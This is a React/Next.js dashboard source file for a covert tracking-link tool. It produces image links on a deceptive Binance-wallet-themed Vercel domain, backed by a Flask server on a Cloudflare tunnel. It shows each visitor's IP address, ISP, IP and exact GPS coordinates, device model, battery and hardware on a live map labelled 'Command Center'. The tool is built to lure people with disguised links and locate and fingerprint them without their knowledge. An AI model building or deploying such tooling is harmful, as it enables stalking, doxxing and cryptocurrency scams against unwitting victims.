"use client";

import { useState, useEffect } from 'react';
import dynamic from 'next/dynamic';
import { RefreshCw, UploadCloud, Link as LinkIcon, MapPin, Monitor, Smartphone, Apple, Trash2, X } from 'lucide-react';

const MapView = dynamic(() => import('./MapView'), { ssr: false, loading: () => <p className="text-zinc-500 p-4 text-center">Loading Map...</p> });

export default function Dashboard() {
  const [links, setLinks] = useState<any[]>([]);
  const [visitors, setVisitors] = useState<any[]>([]);
  const [file, setFile] = useState<File | null>(null);
  const [loading, setLoading] = useState(false);
  const [selectedVisitor, setSelectedVisitor] = useState<any>(null);

  // CHANGE IF CLOUDFLARE RESTARTS
  const FLASK_API = "https://beneficial-acrylic-fighter-saves.trycloudflare.com";
  const VERCEL_URL = "https://binanceassetswallet-usdt-walletaddr.vercel.app";

  const fetchData = async () => {
    setLoading(true);
    try {
      const res = await fetch(`${FLASK_API}/api/visitors`);
      const data = await res.json();
      setLinks(data.links || []);
      setVisitors(data.visitors || []);
    } catch (e) { console.error("Failed to fetch data"); }
    setLoading(false);
  };

  useEffect(() => {
    fetchData();
    const interval = setInterval(fetchData, 10000);
    return () => clearInterval(interval);
  }, []);

  const handleUpload = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!file) return;
    const formData = new FormData();
    formData.append('image', file);
    formData.append('title', 'Binance');
    await fetch(`${FLASK_API}/upload`, { method: 'POST', body: formData });
    setFile(null);
    fetchData();
  };

  const handleDelete = async (id: string) => {
    if (!confirm('Delete this tracking link and its data?')) return;
    await fetch(`${FLASK_API}/api/delete/${id}`, { method: 'POST' });
    fetchData();
  };

  const getDeviceIcon = (ua: string) => {
    if (!ua) return <Monitor size={16} className="text-zinc-400" />;
    if (/iPhone|iPad|iPod/i.test(ua)) return <Apple size={16} className="text-zinc-400" />;
    if (/Android/i.test(ua)) return <Smartphone size={16} className="text-green-400" />;
    return <Monitor size={16} className="text-blue-400" />;
  };

  const getDeviceType = (ua: string) => {
    if (!ua) return 'Unknown';
    if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
    if (/Android/i.test(ua)) return 'Android';
    return 'Desktop';
  };

  return (
    <div className="min-h-screen bg-zinc-950 text-zinc-100 p-4 sm:p-8 font-sans">
      <div className="max-w-7xl mx-auto">
        <header className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-8 gap-4">
          <div>
            <h1 className="text-2xl sm:text-3xl font-bold tracking-tight">Command Center</h1>
            <p className="text-zinc-500 text-sm mt-1">Monitor visits, upload images, and track locations in real-time.</p>
          </div>
          <button onClick={fetchData} disabled={loading} className="flex items-center gap-2 bg-zinc-800 hover:bg-zinc-700 text-zinc-300 px-4 py-2 rounded-lg transition-colors border border-zinc-700">
            <RefreshCw size={16} className={loading ? 'animate-spin' : ''} /> {loading ? 'Refreshing...' : 'Refresh Map'}
          </button>
        </header>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* LEFT COLUMN */}
          <div className="lg:col-span-1 space-y-6">
            <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-6 shadow-lg">
              <h2 className="text-lg font-semibold mb-4 flex items-center gap-2 text-zinc-200"><UploadCloud size={20} className="text-blue-400" /> Upload Image</h2>
              <form onSubmit={handleUpload} className="space-y-4">
                <div className="border-2 border-dashed border-zinc-700 rounded-lg p-4 text-center hover:border-zinc-600 transition-colors cursor-pointer">
                  <input type="file" id="fileUpload" onChange={(e) => setFile(e.target.files?.[0] || null)} required className="hidden" />
                  <label htmlFor="fileUpload" className="cursor-pointer text-sm text-zinc-400">{file ? file.name : 'Click to select an image'}</label>
                </div>
                <button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 rounded-lg font-medium transition-colors">Generate Tracking Link</button>
              </form>
            </div>

            <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-6 shadow-lg">
              <h2 className="text-lg font-semibold mb-4 flex items-center gap-2 text-zinc-200"><LinkIcon size={20} className="text-purple-400" /> Tracking Links</h2>
              <div className="space-y-4 max-h-[400px] overflow-y-auto pr-2">
                {links.length === 0 && <p className="text-zinc-500 text-sm">No links generated yet.</p>}
                {links.map(link => (
                  <div key={link.id} className="bg-zinc-800/50 border border-zinc-800 rounded-lg p-3">
                    <div className="flex items-center gap-2 mb-3">
                      <img src={`${FLASK_API}/uploads/${link.preview_path}`} alt="Preview" className="w-16 h-16 object-cover rounded-md" />
                      <div className="flex-1">
                        <input readOnly value={`${VERCEL_URL}/track/${link.id}`} className="bg-zinc-950 p-2 rounded border border-zinc-800 text-xs text-zinc-400 w-full outline-none mb-2" />
                        <div className="flex gap-2">
                          <button onClick={() => navigator.clipboard.writeText(`${VERCEL_URL}/track/${link.id}`)} className="flex-1 text-xs bg-blue-600/20 text-blue-400 py-1 rounded hover:bg-blue-600/30">Copy Link</button>
                          <button onClick={() => handleDelete(link.id)} className="flex items-center gap-1 text-xs bg-red-600/20 text-red-400 py-1 px-2 rounded hover:bg-red-600/30"><Trash2 size={12} /> Delete</button>
                        </div>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* RIGHT COLUMN */}
          <div className="lg:col-span-2 space-y-6">
            <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-6 shadow-lg">
              <div className="flex justify-between items-center mb-4">
                <h2 className="text-lg font-semibold flex items-center gap-2 text-zinc-200"><MapPin size={20} className="text-red-400" /> Live Locations</h2>
                <div className="flex items-center gap-4 text-xs">
                  <span className="flex items-center gap-1"><span className="w-2 h-2 bg-blue-500 rounded-full"></span> IP Location</span>
                  <span className="flex items-center gap-1"><span className="w-2 h-2 bg-red-500 rounded-full"></span> Exact GPS</span>
                </div>
              </div>
              <div className="h-[400px] bg-zinc-950 rounded-lg overflow-hidden border border-zinc-800">
                <MapView visitors={visitors} />
              </div>
            </div>

            <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-6 shadow-lg overflow-x-auto">
              <h2 className="text-lg font-semibold mb-4 text-zinc-200">Visitor Details (Click row for full data)</h2>
              <table className="w-full text-sm text-left">
                <thead className="text-zinc-500 border-b border-zinc-800">
                  <tr>
                    <th className="py-3 px-2 font-medium">Device</th>
                    <th className="py-3 px-2 font-medium">IP Address</th>
                    <th className="py-3 px-2 font-medium">Location</th>
                    <th className="py-3 px-2 font-medium">Status</th>
                    <th className="py-3 px-2 font-medium">Last Seen</th>
                  </tr>
                </thead>
                <tbody>
                  {visitors.length === 0 && <tr><td colSpan={5} className="text-center py-6 text-zinc-500">No visitors tracked yet.</td></tr>}
                  {visitors.map(v => (
                    <tr key={v.id} onClick={() => setSelectedVisitor(v)} className="border-b border-zinc-800/50 hover:bg-zinc-800/30 cursor-pointer transition-colors">
                      <td className="py-3 px-2 flex items-center gap-2">
                        {getDeviceIcon(v.user_agent)}
                        <span className="text-zinc-400">{getDeviceType(v.user_agent)}</span>
                      </td>
                      <td className="py-3 px-2 text-zinc-400">{v.ip_address}</td>
                      <td className="py-3 px-2 text-zinc-400">{v.ip_city || 'Unknown'}, {v.ip_country || ''}</td>
                      <td className="py-3 px-2">
                        {v.gps_permission_status === 'granted' ? <span className="text-red-400 bg-red-500/10 px-2 py-1 rounded text-xs">GPS Granted</span> : <span className="text-blue-400 bg-blue-500/10 px-2 py-1 rounded text-xs">IP Only</span>}
                      </td>
                      <td className="py-3 px-2 text-zinc-500 text-xs">{new Date(v.last_seen).toLocaleString()}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      </div>

      {/* DETAILS MODAL */}
      {selectedVisitor && (
        <div className="fixed inset-0 z-[100] bg-black/80 flex items-center justify-center p-4" onClick={() => setSelectedVisitor(null)}>
          <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-8 max-w-2xl w-full max-h-[90vh] overflow-y-auto relative" onClick={e => e.stopPropagation()}>
            <button onClick={() => setSelectedVisitor(null)} className="absolute top-4 right-4 text-zinc-500 hover:text-zinc-300"><X size={24} /></button>
            <h2 className="text-2xl font-bold text-white mb-6 flex items-center gap-3">{getDeviceIcon(selectedVisitor.user_agent)} Full Visitor Data</h2>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
              {/* Visit Info */}
              <div className="bg-zinc-800/50 p-4 rounded-lg border border-zinc-700">
                <h3 className="text-blue-400 font-semibold mb-3 border-b border-zinc-700 pb-2">Visit Information</h3>
                <p><span className="text-zinc-500">IP Address:</span> <span className="text-zinc-200">{selectedVisitor.ip_address}</span></p>
                <p><span className="text-zinc-500">First Seen:</span> <span className="text-zinc-200">{new Date(selectedVisitor.first_seen).toLocaleString()}</span></p>
                <p><span className="text-zinc-500">Last Seen:</span> <span className="text-zinc-200">{new Date(selectedVisitor.last_seen).toLocaleString()}</span></p>
                <p><span className="text-zinc-500">Visits:</span> <span className="text-zinc-200">{selectedVisitor.visit_count || 1}</span></p>
              </div>

                          {/* Browser Info */}
              <div className="bg-zinc-800/50 p-4 rounded-lg border border-zinc-700">
                <h3 className="text-purple-400 font-semibold mb-3 border-b border-zinc-700 pb-2">Device & Browser</h3>
                <p><span className="text-zinc-500">OS:</span> <span className="text-zinc-200">{selectedVisitor.operating_system || 'N/A'}</span></p>
                <p><span className="text-zinc-500">Browser:</span> <span className="text-zinc-200">{selectedVisitor.browser} {selectedVisitor.browser_version || ''}</span></p>
                <p><span className="text-zinc-500">Screen:</span> <span className="text-zinc-200">{selectedVisitor.screen_resolution || 'N/A'}</span></p>
                <p><span className="text-zinc-500">CPU Cores:</span> <span className="text-zinc-200">{selectedVisitor.cpu_cores || 'N/A'}</span></p>
                <p><span className="text-zinc-500">RAM:</span> <span className="text-zinc-200">{selectedVisitor.device_memory ? selectedVisitor.device_memory + 'GB' : 'N/A'}</span></p>
                <p><span className="text-zinc-500">Battery:</span> <span className="text-zinc-200">{selectedVisitor.battery_level ? Math.round(selectedVisitor.battery_level * 100) + '%' : 'N/A'}</span></p>
                
                {/* NEW: Exact Device Model Box */}
                <div className="mt-3 pt-3 border-t border-zinc-700">
                  <p className="text-zinc-500 text-xs mb-1.5">Exact Device Model (User Agent):</p>
                  <div className="bg-zinc-950 p-2.5 rounded-md border border-zinc-800 max-h-24 overflow-y-auto">
                    <p className="text-zinc-300 text-[10px] leading-relaxed break-all font-mono">
                      {selectedVisitor.user_agent || 'N/A'}
                    </p>
                  </div>
                </div>
              </div>

              {/* IP Location */}
              <div className="bg-zinc-800/50 p-4 rounded-lg border border-zinc-700">
                <h3 className="text-blue-400 font-semibold mb-3 border-b border-zinc-700 pb-2">IP Location</h3>
                <p><span className="text-zinc-500">City:</span> <span className="text-zinc-200">{selectedVisitor.ip_city || 'N/A'}</span></p>
                <p><span className="text-zinc-500">Region:</span> <span className="text-zinc-200">{selectedVisitor.ip_region || 'N/A'}</span></p>
                <p><span className="text-zinc-500">Country:</span> <span className="text-zinc-200">{selectedVisitor.ip_country || 'N/A'}</span></p>
                <p><span className="text-zinc-500">ISP:</span> <span className="text-zinc-200">{selectedVisitor.ip_isp || 'N/A'}</span></p>
                <p><span className="text-zinc-500">Lat/Lon:</span> <span className="text-zinc-200">{selectedVisitor.ip_latitude}, {selectedVisitor.ip_longitude}</span></p>
              </div>

              {/* GPS Location */}
              <div className="bg-zinc-800/50 p-4 rounded-lg border border-zinc-700">
                <h3 className="text-red-400 font-semibold mb-3 border-b border-zinc-700 pb-2">Exact GPS Location</h3>
                {selectedVisitor.gps_permission_status === 'granted' ? (
                  <>
                    <p><span className="text-zinc-500">Lat/Lon:</span> <span className="text-zinc-200">{selectedVisitor.gps_latitude}, {selectedVisitor.gps_longitude}</span></p>
                    <p><span className="text-zinc-500">Accuracy:</span> <span className="text-zinc-200">{selectedVisitor.gps_accuracy ? selectedVisitor.gps_accuracy.toFixed(2) + 'm' : 'N/A'}</span></p>
                    <p><span className="text-zinc-500">Altitude:</span> <span className="text-zinc-200">{selectedVisitor.gps_altitude ? selectedVisitor.gps_altitude.toFixed(2) + 'm' : 'N/A'}</span></p>
                    <p><span className="text-zinc-500">Speed:</span> <span className="text-zinc-200">{selectedVisitor.gps_speed ? selectedVisitor.gps_speed.toFixed(2) + 'm/s' : 'N/A'}</span></p>
                  </>
                ) : (
                  <p className="text-zinc-500 italic">GPS Access Denied or Pending</p>
                )}
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}